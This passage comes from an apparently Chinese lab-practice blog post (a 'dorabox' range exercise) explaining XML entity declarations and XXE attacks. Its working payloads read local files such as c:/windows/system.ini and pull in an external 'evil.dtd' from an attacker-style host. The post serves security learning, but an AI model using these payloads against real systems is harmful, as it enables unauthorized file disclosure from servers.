class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">copyright</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">test</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">reset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">login</span>&gt;</span><span class=\"symbol\">&amp;test;</span><span class=\"tag\">&lt;/<span class=\"name\">login</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">secret</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">secret</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上述两种均为引用实体，主要在<strong> XML 文档中</strong>被应用，引用方式：<strong>&amp; 实体名称；</strong> 末尾要带上分号，这个引用将直接转变成实体内容。</p>\n<p><strong>3. 参数实体声明</strong></p>\n<!ENTITY % 实体名称 \"实体的值\"> \n<!ENTITY % 实体名称 SYSTEM \"URI/URL\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">copyright</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">body</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://www.runoob.com/entities.dtd&quot;</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;%body;&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">reset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">secret</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">secret</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>参数实体，被<strong> DTD 文件</strong>自身使用 ，引用方式为：% 实体名称。和通用实体一样，参数实体也可以外部引用。</p>\n<p>允许<strong>包含外部实体</strong>，就可能存在 XXE 攻击。</p>\n<p><strong>【利用 1】读取本地文件</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">creds</span> [  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">goodies</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">creds</span>&gt;</span><span class=\"symbol\">&amp;goodies;</span><span class=\"tag\">&lt;/<span class=\"name\">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>【利用 2】读取含特殊字符的本地文件</strong></p>\n<p>如果文件中含有特殊字符，如 &amp;,&lt;,&gt;,&quot;,' 等，通过上述方法会报错，需要借助 CDATA，CDATA 节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">roottag</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">start</span> <span class=\"meta-string\">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">goodies</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///C:/phpStudy/WWW/zhan/XXE-K/test.txt&quot;</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">end</span> <span class=\"meta-string\">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">dtd</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://192.168.220.143:8888/zhan/XXE-K/evil.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%dtd; ]&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">roottag</span>&gt;</span><span class=\"symbol\">&amp;all;</span><span class=\"tag\">&lt;/<span class=\"name\">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"最后哦\"><a class=\"markdownIt-Anchor\" href=\"#最后哦\">#</a> 最后哦</h1>\n<p>小心眼 + 记仇の milkii0，会打败你们的！</p>\n",
            "tags": [
                "dorabox,靶场练习"
            ]
        }
    ]
}